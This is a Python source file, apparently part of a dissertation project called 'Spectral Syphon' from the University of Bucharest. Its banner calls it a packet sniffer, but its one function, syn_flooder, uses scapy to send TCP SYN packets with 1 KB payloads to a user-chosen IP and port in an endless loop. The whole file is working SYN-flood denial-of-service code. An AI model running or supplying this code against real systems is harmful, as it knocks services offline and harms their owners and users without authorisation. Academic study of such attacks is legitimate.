###########################################################################
###########################################################################
###########################################################################
###########                                                     ###########
###########                  SPECTRAL SYPHON                    ###########
###########                   Packet sniffer                    ###########
###########                    Version 1.0                      ###########
###########                                                     ###########
###########               PROIECT DE DISERTATIE                 ###########
###########         Author: Ion-Margarit Adrian-Florin          ###########
###########       Facultatea de Matematica si Informatica       ###########
###########             Universitatea din Bucuresti             ###########
###########                                                     ###########
###########################################################################
###########################################################################
###########################################################################

import sys
import os
import random
from scapy.all import *
from colorama import Fore, Back, Style


def syn_flooder(source_port, target_ip, target_port):
    # Check if the user is running the script as root/sudo, and if not exit
    if not "SUDO_UID" in os.environ.keys():
        print(
            f"{Fore.RED}[!!!] You need to be root or sudo to run this script!{Style.RESET_ALL}"
        )
        sys.exit()

    try:
        if source_port.lower() == "r":
            source_port = int(RandShort())
        else:
            source_port = int(source_port)

        choice = input(
            f"{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} Source port: {Style.RESET_ALL}{Fore.CYAN}{source_port}{Style.RESET_ALL}\n{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} Target IP: {Style.RESET_ALL}{Fore.CYAN}{target_ip}{Style.RESET_ALL}\n{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} Target port: {Style.RESET_ALL}{Fore.CYAN}{target_port}{Style.RESET_ALL}\n{Fore.YELLOW}Do you wish to continue? [Y/N]: {Style.RESET_ALL}"
        )

        if choice.lower() == "y":
            i = 0
            ip = IP(dst=target_ip)
            tcp = TCP(sport=source_port, dport=int(target_port), flags="S")
            raw = Raw(b"X" * 1024)
            p = ip / tcp / raw

            print(
                f"{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.YELLOW} Sending packets to {Style.RESET_ALL}{Fore.CYAN}{target_ip}{Style.RESET_ALL}{Fore.YELLOW} on port {Style.RESET_ALL}{Fore.CYAN}{target_port}{Style.RESET_ALL}{Fore.YELLOW}...{Style.RESET_ALL}"
            )

            send(p, loop=1, verbose=0)

        else:
            print(f"{Fore.RED}[!!!] Exiting...{Style.RESET_ALL}")
            sys.exit("\n")

    except KeyboardInterrupt:
        print(f"{Fore.RED}[!!!] User stopped the application...{Style.RESET_ALL}")
        sys.exit("^C\n")

    except Exception as e:
        print(f"{Fore.RED}[!!!] Error: {e}{Style.RESET_ALL}")
        sys.exit("\n")
